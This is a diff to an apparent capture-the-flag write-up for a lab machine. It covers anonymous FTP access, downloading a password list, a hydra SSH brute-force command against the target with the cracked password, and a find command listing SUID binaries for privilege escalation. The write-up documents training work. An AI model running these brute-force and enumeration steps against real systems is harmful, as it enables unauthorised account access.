@@ -54,5 +54,91 @@ HOP RTT     ADDRESS
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Navigated to the web server on port 80
+Navigated to the web server on port 80 which gave a short intro to the challenge context (so not within scope of the CTF target, so to speak)
+
+-> After:
+
+Connected to the open ftp port which gave message saying it supported anonymous login only
+
+ftp 10.10.255.159
+
+No password.
+
+Had two files available:
+
+locks.txt
+task.txt
+
+GET for both of them onto machine
+
+Read task.txt first:
+
+cat task.txt
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+
+
+and then locks.txt:
+
+at locks.txt
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+
+
+hydra -l lin -P locks.txt ssh://10.10.255.159 -t 4
+
+Succesful - RedDr4gonSynd1cat3
+
+Once logged in as lin we were able to get the user flag!
+
+
+find / -perm -u=s -type f 2>/dev/null
+
+/usr/sbin/pppd
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/snapd/snap-confine
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ping6
+/bin/umount
 
